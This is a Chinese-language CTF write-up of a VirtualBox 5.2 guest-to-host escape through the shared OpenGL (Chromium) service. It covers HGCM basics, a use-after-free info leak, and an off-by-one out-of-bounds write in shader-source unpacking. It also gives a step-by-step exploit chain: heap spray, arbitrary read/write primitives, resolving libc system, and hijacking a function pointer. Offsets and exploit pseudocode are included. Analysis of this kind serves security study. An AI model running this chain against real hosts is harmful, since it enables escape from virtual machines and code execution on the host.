## 1. 基础知识

### 1.1 HGCM

HGCM是guest用来与host通信的一套协议，基本流程是：

- 通信流程

    ```c
    // step 1
    fd = open("/dev/vboxuser", O_RDWR);
    // step 2 connect
    info.Loc.type = VMMDevHGCMLoc_LocalHost_Existing;
    strcpy(info.Loc.u.host.achName, "VBoxSharedCrOpenGL");
    ioctl(fd, IOCTL_HGCM_CONNECT, &info, sizeof(info));
    // step 3 VBOXGUEST_IOCTL_HGCM_CALL
    // SHCRGL_GUEST_FN_SET_VERSION
    // SHCRGL_GUEST_FN_SET_PID
    parms.hdr.u32ClientID = u32ClientID;
    parms.hdr.u32Function = SHCRGL_GUEST_FN_SET_PID;
    parms.hdr.cParms = SHCRGL_CPARMS_SET_PID;
    parms.u64PID.type = VMMDevHGCMParmType_64bit;
    parms.u64PID.u.value64 = GetCurrentProcessId();
    BOOL rc = ioctl(fd, VBOXGUEST_IOCTL_HGCM_CALL, &parms,
    sizeof(parms), &parms, sizeof(parms), &cbReturned, NULL);
    // step 4 VBOXGUEST_IOCTL_HGCM_DISCONNECT
    ```

### 1.2 Chromium

Virtualbox的3d模拟是通过shared OpenGL来实现的，后者是基于Chromium开发的。Chromium有三种交互模式：

- 交互模式

    ```
    That sequence can be performed by the Chromium client in
    different ways:
    1. Single-step: send the rendering commands and receive the
    resulting frame buffer with one single message.
    2. Two-step: send a message with the rendering commands
    and let the server interpret them, then send another
    message requesting the resulting frame buffer.
    3. Buffered: send the rendering commands and let the server
    store them in a buffer without interpreting it, then send a
    second message to make the server interpret the buffered
    commands and return the resulting frame buffer.
    ```

本文利用的是Buffered模式，guest首先通过HGCM_CALL(SHCRGL_GUEST_FN_WRITE_BUFFER)发送请求，请求的信息并不会被解析，而是保存在cr_unpackData中；

当guest再次发送`HGCM_CALL(SHCRGL_GUEST_FN_WRITE_READ_BUFFERED)`请求时，VirtualBox会通过`uiId`找到请求信息，交由`crUnpack`函数处理。`crUnpack`函数会

根据`CR_MESSAGE_OPCODES`调用不同的处理函数，具体函数由`unpack.py`通过`APIspec.txt`来生成。一个crUnpack的调用栈：

- 调用栈

    ```
    [#0] 0x7fe6e19f77c5->crUnpackExtendGetUniformLocation()
    [#1] 0x7fe6e19f4068->crUnpackExtend()
    [#2] 0x7fe6e19ee7f0->crUnpack(data=0x7fe639517070, data_end=0x7fe6395172f0, opcodes=0x7fe63951706f, num_opcodes=0x1, table=0x7fe6e1a65a30 <cr_server+13008>)
    [#3] 0x7fe6e1920fe4->crServerDispatchMessage(conn=0x7fe6c48b7640, msg=0x7fe639517060, cbMsg=0x290)
    [#4] 0x7fe6e19215fe->crServerServiceClient(qEntry=0x7fe6c48b7e30)
    [#5] 0x7fe6e1921773->crServerServiceClients()
    [#6] 0x7fe6e18f764f->crVBoxServerInternalClientWriteRead(pClient=0x7fe6c48b6970)
    [#7] 0x7fe6e18f792d->crVBoxServerClientWrite(u32ClientID=0x45, pBuffer=0x7fe639517060 "\\\\001LGwAAAA\\\\001", cbBuffer=0x290)
    [#8] 0x7fe6e18db4a8->svcCall(callHandle=0x7fe6d4893150, u32ClientID=0x45, pvClient=0x7fe6c80076b0, u32Function=0xe, cParms=0x3, paParms=0x7fe6d488ec10)
    [#9] 0x7fe712b81001->hgcmServiceThread(ThreadHandle=0x80000011, pvUser=0x7fe6c8002c60)
    ```

### 1.3 3dpwn

[https://github.com/niklasb/3dpwn/](https://github.com/niklasb/3dpwn/)已经存在对于hgcm和chromium的协议客户端库，可以用于请求hgcm和chromium的调用。

[[3](https://github.com/niklasb/3dpwn/)dpwn](https://www.notion.so/3dpwn-814ff8a6921349ae86174a3d53e9cb6c)

[CVE-2018-3055/3085](https://www.notion.so/CVE-2018-3055-3085-496d3f2ebeec42d0925255e9403977cd)

```
$ VBoxHeadless -s <vmname> &
$ sudo gdb -p $(pgrep -f vmname) -ex c

```

## 2. 漏洞分析

### 2.1 环境准备

下载[https://drive.google.com/file/d/1IuRvlqWiZp7UhGN4BPifRS-NTDk5xdrd/view](https://drive.google.com/file/d/1IuRvlqWiZp7UhGN4BPifRS-NTDk5xdrd/view)虚拟机镜像，在ubuntu 18上运行。

下载[https://www.virtualbox.org/wiki/Download_Old_Builds_5_2](https://www.virtualbox.org/wiki/Download_Old_Builds_5_2)源码，并分析。

IDA分析目标为[`VBoxSharedCrOpenGL.so`](http://vboxsharedcropengl.so/)；gdb调试VirtualBox进程。

### 2.2 信息泄露

- 漏洞点

    ```c
    void crUnpackExtendGetUniformLocation(void)
    {
        int packet_length = READ_DATA(0, int);
        GLuint program = READ_DATA(8, GLuint);
        const char *name = DATA_POINTER(12, const char);
        SET_RETURN_PTR(packet_length-16);
        SET_WRITEBACK_PTR(packet_length-8);
        cr_unpackDispatch.GetUniformLocation(program, name);
    }
    ```

信息泄露触发流程为：

1. `HGCM_CONNECT()`生成`CRClient`(0x9e0)与`CRConnection`(0x2a0)的堆块；其中`crclient→conn = crconnection & crconnection→pClient[0x248] = crclient`
2. `HGCM_DISCONNECT()`释放`CRClient`与`CRConnection`
3. `HGCM_CALL(SHCRGL_GUEST_FN_WRITE_BUFFER, 0x290, [CR_GETUNIFORMLOCATION_EXTEND_OPCODE, offset=0x248])`生成的message会占据释放的`CRConnection`堆块
4. `HGCM_CALL(SHCRGL_GUEST_FN_WRITE_READ_BUFFERED)` ⇒ `svcCall` ⇒ `crUnpack(0xfc) ⇒ crUnpackExtend(0xa4) ⇒ crUnpackExtendGetUniformLocation`，会处理步骤3生成的message，并将读取的`crclient`地址返回给guest
- 调试信息

    ```c
    set $gl=base of VBoxSharedCrOpenGL.so
    b *($gl+0x278ab) //crconnection堆块生成位置
    b *($gl+0xc2550) crUnpackExtend (crUnpack 0xf7)
    b *($gl+0xc7120) crUnpackExtendGetUniformLocation (crUnpackExtend 0xe4)
    cr_unpackData x/gx $gl+0x3106c0

    // conn被覆盖为leak msg
    gdb-peda$ x/20gx $conn-0x10
    0x7fbaf49f7f50:	0x0000000000000000	0x00000000000002a5
    0x7fbaf49f7f60:	0x4141414177474c01	0xf700000000000001
    0x7fbaf49f7f70:	0x000000a400000248	0x5445454c00000000
    // conn->0x248 == client
    gdb-peda$ x/gx $conn+0x248
    0x7fbaf49f81a8:	0x00007fbaf49f7580
    gdb-peda$ p/x $conn-0x9e0
    $1 = 0x7fbaf49f7580
    // 因此，通过0x248泄露的地址可以得到conn的地址

    gdb-peda$ x/gx $conn+0xd8 [1]
    0x7fbaf49f8038:	0x00007fbb0ac73650
    gdb-peda$ vmmap 0x00007fbb0ac73650
    Start              End                Perm	Name
    0x00007fbb0ac53000 0x00007fbb0ac81000 r-xp	/usr/lib/virtualbox/VBoxOGLhostcrutil.so
    gdb-peda$ p 0x00007fbb0ac73650-0x00007fbb0ac53000
    $3 = 0x20650 [2]
    gdb-peda$ set $util=0x00007fbb0ac53000
    gdb-peda$ x/gx $util+0x22e3d0 [3]
    0x7fbb0ae813d0:	0x00007fbb7e3fcec0
    gdb-peda$ x/i 0x00007fbb7e3fcec0
    0x7fbb7e3fcec0 <socket>:	mov    eax,0x29
    gdb-peda$ p 0x00007fbb7e3fcec0-0x122ec0 [4]
    $7 = 0x7fbb7e2da000
    gdb-peda$ vmmap 0x7fbb7e2da000
    Start              End                Perm	Name
    0x00007fbb7e2da000 0x00007fbb7e4c1000 r-xp	/lib/x86_64-linux-gnu/libc-2.27.so
    gdb-peda$ x/i 0x7fbb7e2da000+0x4f440 [5]
    0x7fbb7e329440 <__libc_system>:	test   rdi,rdi
    /**
    [1] $conn+0xd8 => crVBoxHGCMFree
    [2] crVBoxHGCMFree-0x20650 => VBoxOGLhostcrutil.so
    [3] VBoxOGLhostcrutil.so+0x22e3d0 => got@socket
    [4] socket-0x122ec0 => libc-2.27.so
    [5] libc-2.27.so+0x4f440 => system
    ```

### 2.3 越界写

- 漏洞点

    ```c
    void crUnpackExtendShaderSource(void)
    {
        GLint *length = NULL;
        GLuint shader = READ_DATA(8, GLuint);
        GLsizei count = READ_DATA(12, GLsizei); [1]
        GLint hasNonLocalLen = READ_DATA(16, GLsizei);
        GLint *pLocalLength = DATA_POINTER(20, GLint);
    		char **ppStrings = NULL;
        GLsizei i, j, jUpTo;
        int pos, pos_check;
    		pos = 20 + count * sizeof(*pLocalLength);

        if (hasNonLocalLen > 0)
        {
            length = DATA_POINTER(pos, GLint);
            pos += count * sizeof(*length);
        }

        pos_check = pos;
    		for (i = 0; i < count; ++i)
        {
            if (pLocalLength[i] <= 0 || pos_check >= INT32_MAX - pLocalLength[i]
    				 || !DATA_POINTER_CHECK(pos_check)) [2]
            {
                crError("crUnpackExtendShaderSource: pos %d is out of range", pos_check);
                return;
            }

            pos_check += pLocalLength[i]; [3]
        }
    		ppStrings = crAlloc(count * sizeof(char*));
    		for (i = 0; i < count; ++i)
        {
            ppStrings[i] = DATA_POINTER(pos, char);
            pos += pLocalLength[i];
            if (!length)
            {
                pLocalLength[i] -= 1;
            }

            Assert(pLocalLength[i] > 0);
            jUpTo = i == count -1 ? pLocalLength[i] - 1 : pLocalLength[i];
            for (j = 0; j < jUpTo; ++j)
            {
                char *pString = ppStrings[i];

                if (pString[j] == '\0')
                {
                    Assert(j == jUpTo - 1); [4]
                    pString[j] = '\n';
                }
            }
        }

    //    cr_unpackDispatch.ShaderSource(shader, count, ppStrings, length ? length : pLocalLength);
        cr_unpackDispatch.ShaderSource(shader, 1, (const char**)ppStrings, 0);

        crFree(ppStrings);
    ```

- 问题

```c
[1] 当count = 1<<32时，malloc(count * sizeof(char*))等价于malloc(0)，因此存在整数溢出
问题，然而由于不会进入for(i=0;i<count;i++)循环，因此不会造成更大的影响；
[2] DATA_POINTER_CHECK(pos_check)会检查pos_check是否在合理范围内，但是每次在[3]处更新
pos_check后，会在下一个iteration才会进行检查，因此最后一个pLocalLength[i]并没有进行检查，
正确的写法应该讲[2]处的检查放在[3]后面。

通过这个问题[2]，我们可以控制传入的数据，使得pLocalLength[count-1]为一个非常大的值，造成越界。
而在[4]处存在一个越界写，将所有\0改为\n。
```

调用流程：

`HGCM_CALL(CR_SHADERSOURCE_EXTEND_OPCODE) ⇒ svCall ⇒ crUnpackExtendShaderSource`

- 调试信息

    ```
    b *($gl+0xc6710)

    gdb-peda$ x/gx $gl+0x3106c0
    0x7fbb0b1946c0 <cr_unpackData>:	0x00007fbaf50848d0
    gdb-peda$ x/20gx 0x00007fbaf50848d0-0x10
    0x7fbaf50848c0:	0x4141414177474c01	0xf700000000000001
    0x7fbaf50848d0:	0x000000f061616161	0x0000000200000000
    0x7fbaf50848e0:	0x0000000100000000	0x414141410000001c
    0x7fbaf50848f0:	0x0000000000000000	0x0000000000000035
    0x7fbaf5084900:	0x0000003000003a37	0x00007fbaf5084930
    0x7fbaf5084910:	0x00007fbaf5084890	0x00007fbaf5084970
    finish
    gdb-peda$ x/20gx 0x00007fbaf50848d0-0x10
    0x7fbaf50848c0:	0x4141414177474c01	0xf700000000000001
    0x7fbaf50848d0:	0x000000f061616161	0x0000000200000000
    0x7fbaf50848e0:	0x0000000000000000	0x414141410000001b
    0x7fbaf50848f0:	0x0a0a0a0a0a0a0a0a	0x0a0a0a0a0a0a0a35
    0x7fbaf5084900:	0x000a0a300a0a3a37	0x00007fbaf5084930
    # 由于0x7fbaf5084908-0x7fbaf50848d0=0x38,pos最开始为20+count*4=0x1c,因此需要0x38-0x1c=0x1c，
    # 而jUpTo = i == count -1 ? pLocalLength[i] - 1 : pLocalLength[i];表明最后一次循环还要有一个-1，
    # 因此第二个长度为0x1c-1+1=0x1c，至此下一个CRVBOXSVCBUFFER_t变成了uiID=0a0a3a37 & uiSize=0x000a0a30

    # 后面，可以通过这个可控的堆块和泄露的pConn来做任意地址读写了
    gdb-peda$ watch *($conn+0x238)
    Hardware watchpoint 4: *($conn+0x238)
    gdb-peda$ watch *0x00007fbaf5084930
    Hardware watchpoint 5: *0x00007fbaf5084930

    ```

## 3. EXP分析

- Heap Spray

    ```c
    alloc_buf(client,sz,msg='a') => hgcm_call(client, SHCRGL_GUEST_FN_WRITE_BUFFER, [0,sz,0,msg])
    //参数pack方式：
    // int => pack("<IIQ", intType, gparam, 0) 整数加密成IIQ
    // other => pack("<IIQ", addrType, len(gparam), addressof(gparam)) + len(gparam) 地址加密成IIQ+长度
    => svcCall(SHCRGL_GUEST_FN_WRITE_BUFFER):
    	pBuffer = msg.addr;
    	iBuffer = 0;
    	offset = 0;
    	msgSize = msg.size;
    	// 申请2个堆块;拷贝msg到新生成的CRVBOXSVCBUFFER_t中
    	pSvcBuffer = svcGetBuffer(iBuffer, sz); => buf=malloc(sizeof(CRVBOXSVCBUFFER_t)); buf->pData = malloc(sz);return buf;
    	memcpy(pSrvBuffer->pData+offset, pBuffer, msgSize);
    	paParms[0].u.uint32 = pSvcBuffer->uiId; //返回uid

    eg:
    alloc_buf(client, 0x290): 生成buf= new CRVBOXSVCBUFFER_t(.pData=malloc(0x290));buf.pData <= 'a'

    typedef struct _CRVBOXSVCBUFFER_t {
        uint32_t uiId;
        uint32_t uiSize;
        void*    pData;
        _CRVBOXSVCBUFFER_t *pNext, *pPrev;
    } CRVBOXSVCBUFFER_t;
    ```

- Alloc Client&Connection

    ```c
    static DECLCALLBACK(int) svcConnect (void *, uint32_t u32ClientID, void *pvClient)
    {
    	int rc = crVBoxServerAddClient(u32ClientID);
    	return rc;
    }
    int32_t crVBoxServerAddClient(uint32_t u32ClientID)
    {
    	CRClient *newClient = crCalloc(sizeof(CRClient));// [HERE] CRClient (0x9d0)
    	newClinet->conn = crNetAcceptClient(cr_server.protocol, NULL,
                                            cr_server.tcpip_port,
                                            cr_server.mtu, 0);
    	crServerAddToRunQueue(newClient);
    }
    CRConnection *
    crNetAcceptClient( const char *protocol, const char *hostname,
                                         unsigned short port, unsigned int mtu, int broker )
    {
    	CRConnection *conn = crCalloc(sizeof(*conn));// [HERE] CRConnection (0x298)
    	...
    	return conn;
    }
    svcConnect => crVBoxServerAddClient : crCalloc(sizeof(CRClient))
    => crNetAcceptClient => crCalloc(sizeof(CRConnect))
    ```

- Leak Connection

    ```c
    crmsg(client, msg, bufsz=0x1000):
    	buf_uid = alloc_buf(client, bufsz, msg)
    	hgcm_call(client, SHCRGL_GUEST_FN_WRITE_READ_BUFFERED, [buf_uid, "A"*bufsz, 1337])
    => svcCall(SHCRGL_GUEST_FN_WRITE_READ_BUFFERED):
    	pWriteback = param[1].addr
    	cbWriteback = param[1].size
    	pSvcBuffer = svcGetBuffer(buf_uid, 0);//从全局buf链表中找到该buf
    	pBuffer = pSvcBuffer->pData;//msg
    	crVBoxServerClientWrite(u32ClientID, pBuffer, cbBuffer); => crUnpackExtend... //根据msg的ExtendCode执行对应的操作
    	crVBoxServerClientRead(u32ClientID, pWriteback, &cbWriteback); //读取执行完的结果，结果存储在原来的"A"*bufsz的地址
    	svcFreeBuffer(pSvcBuffer);

    eg:
    msg = CR_GETUNIFORMLOCATION_EXTEND_OPCODE, 0x248: 生成一个可以读取后面0x248数据的msg
    ```

- Setup Write

    ```python
    """
    通过CR_SHADERSOURCE_EXTEND_OPCODE构造越界写，使得下一个CRVBOXSVCBUFFER_t数据的头部被修改为0x0a0a...的模式
    之后可以通过此特殊的uiId来索引到这个结构体，由于其size非常大，因此可以做任意地址读写
    """
    msg = CR_SHADERSOURCE_EXTEND_OPCODE, [0,2,0,1,0x1a+2] #len(msg)属于0x40的堆块
    uiIds = [alloc_buf(client, len(msg), msg) for i in range(1000)]
    _,res,_ = hgcm_call(client, SHCRGL_GUEST_FN_WRITE_READ_BUFFERED, [uiIds[-5],'A'*50, 0x50])
    over_uiId = 0x0a0a0000+uiIds[-4]
    over_uiSize = 0x0a0a30
    ```

- Arbitrary Write

    ```python
    arb_write(where, what):
    	payload = [over_uiId,over_uiSize,0x40,'A'*8+pack('<Q',where)]
    	# 修改over_uiID的下一个CRVBOXSVCBUFFER_t结构体，0x40是实际msg的大小
    	# 因此会将下一个结构体修改为{.uiID='AAAA', .uiSize='AAAA', .pData=where}
    	hgcm_call(client,SHCRGL_GUEST_FN_WRITE_BUFFER,payload)
    	# *where = what
    	hgcm_call(client, SHCRGL_GUEST_FN_WRITE_BUFFER, ['AAAA','AAAA',0,what])
    ```

- Arbitrary Read

    ```python
    arb_read(where, n):
    	# 将pConn->pHostBuffer修改为where
    	arb_write(pConn+OFFSET_CONN_HOSTBUF,where)
    	arb_write(pConn+OFFSET_CONN_HOSTBUFSZ,n)
    	# 通过SHCRGL_GUEST_FN_READ读取where的内容，client3实际上会占据之前释放的crclient堆块
    	hgcm_call(client3, SHCRGL_GUEST_FN_READ, ['A'*0x1000,0x1000])
    ```

- EXP

    ```python
    # 1.heap_spray
    alloc_buf(0x9d0) & alloc_buf(0x290) for i in range(600)
    newclient = hgcm_connect('VBoxSharedCrOpenGL')
    #alloc_buf(0x9d0) & alloc_buf(0x290)
    hgcm_disconnect(newclient)
    # 2.leak connection
    msg = CR_GETUNIFORMLOCATION_EXTEND_OPCODE, 0x248
    pClient = crmsg(client1, msg, 0x290) #会释放0x290的msg
    pConn = pClient + 0x9e0
    client3 = hgcm_connect('vBoxSharedCrOpenGL') #client3会占据newclient的位置
    # 3.setup write
    msg = CR_SHADERSOURCE_EXTEND_OPCODE, [0,2,0,1,0x1a+2]
    uiIds = [alloc_buf(client, len(msg), msg) for i in range(1000)]
    _,res,_ = hgcm_call(client, SHCRGL_GUEST_FN_WRITE_READ_BUFFERED, [uiIds[-5],'A'*50, 0x50])
    over_uiId = 0x0a0a0000+uiIds[-4]
    # 4. read Free
    HGCMFree = arb_read(pConn+OFFSET_CONN_FREE,8)
    libbase = HGCMFree - offset(0x20650)
    system = arb_read(libbase+0x22e3d0,8)
    arb_write(pConn+0x128, system)
    arb_write(pConn, "mousepad /home/c3mousepad /home/c3ctf/Desktop/flag.txt\x00")
    ```

[exp](https://www.notion.so/exp-6706aaa7d638400295eeeeecbefdcd1e)

## 问题

1. 结构体偏移`gef> pahole CRClient`
2. 调试

```bash
$ VBoxHeadless -s <vmname> &
$ sudo gdb -p $(pgrep -f vmname) -ex c
```
